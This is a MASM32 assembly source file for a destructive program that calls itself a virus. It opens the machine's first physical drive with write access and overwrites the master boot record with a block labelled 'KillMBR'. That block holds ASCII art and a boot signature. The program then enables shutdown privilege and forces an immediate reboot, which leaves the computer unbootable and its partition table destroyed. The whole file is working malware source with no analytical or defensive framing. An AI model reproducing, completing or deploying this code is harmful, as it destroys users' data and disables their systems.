; ---- skeleton -----------------------------------------------------------
.386
.model flat, stdcall
option casemap :none   ; case sensitive

; ---- Include ------------------------------------------------------------
include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\ntdll.inc
include \masm32\include\shell32.inc
include \masm32\macros\macros.asm

includelib \masm32\lib\shell32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\ntdll.lib

; ---- Initialized data ---------------------------------------------------
.data
volume  db '\\.\PhysicalDrive0',0 

; New bootloader will print "I am virus! Got you :-)"
KillMBR		db 20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,5Fh,2Eh,2Dh,5Eh,5Eh,2Dh,2Dh,2Dh,2Eh,2Eh,2Eh,2Eh,2Ch,2Ch,2Dh,2Dh,0Dh,0Ah
		db 20h,20h,20h,20h,20h,20h,20h,20h,5Fh,2Dh,2Dh,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,2Dh,2Dh,5Fh,0Dh,0Ah
		db 20h,20h,20h,20h,3Ch,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,3Eh,0Dh,0Ah
		db 20h,20h,20h,20h,7Ch,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,7Ch,0Dh,0Ah
		db 20h,20h,20h,20h,20h,5Ch,2Eh,5Fh,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,5Fh,2Eh,2Fh,0Dh,0Ah
		db 20h,20h,20h,20h,20h,20h,20h,20h,60h,60h,60h,2Dh,2Dh,2Eh,20h,2Eh,20h,2Ch,20h,3Bh,20h,2Eh,2Dh,2Dh,27h,27h,27h,0Dh,0Ah
		db 20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,7Ch,20h,7Ch,20h,20h,20h,7Ch,0Dh,0Ah
		db 20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,2Eh,2Dh,3Dh,7Ch,7Ch,20h,20h,7Ch,20h,7Ch,3Dh,2Dh,2Eh,0Dh,0Ah
		db 20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,60h,2Dh,3Dh,23h,24h,25h,26h,25h,24h,23h,3Dh,2Dh,27h,0Dh,0Ah
		db 20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,20h,7Ch,20h,3Bh,20h,20h,3Ah,7Ch,0Dh,0Ah
		db 20h,20h,20h,20h,20h,20h,5Fh,5Fh,5Fh,5Fh,5Fh,2Eh,2Ch,2Dh,23h,25h,26h,24h,40h,25h,23h,26h,23h,7Eh,2Ch,2Eh,5Fh,5Fh,5Fh,5Fh,5Fh,0Dh,0Ah
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,55h,0AAh

; ---- Uninitialized data -------------------------------------------------
.data?
buffer		dd 512 dup (?)
bytesWritten	dd 512 dup (?)
hFile		dd ?

; ---- Code ---------------------------------------------------------------
.code
start:
	invoke CreateFile,offset volume,GENERIC_READ+GENERIC_WRITE,FILE_SHARE_READ+FILE_SHARE_WRITE,0,OPEN_EXISTING,0,0
	    .if eax==0 ;If fail jump on ExitProcess
	    .else
        	mov hFile,eax
        		cld ;Trick to move the bootloader into the buffer with rep movsb
        		lea esi, KillMBR
        		lea edi, buffer
        		mov ecx, 512
        		rep movsb
        	push eax
        	mov eax,esp
	invoke WriteFile,hFile,addr buffer,512,addr bytesWritten,NULL ;write the new bootloader
	    .if eax==0 ;If fail jump on ExitProcess
		.else
			invoke CloseHandle,hFile
			invoke RtlAdjustPrivilege,13h,1h,0h,esp ;Needed for reboot
			invoke ExitWindowsEx,2,10 ;Reboot the computer
		.endif
		.endif
finish:
	invoke ExitProcess,0
end start
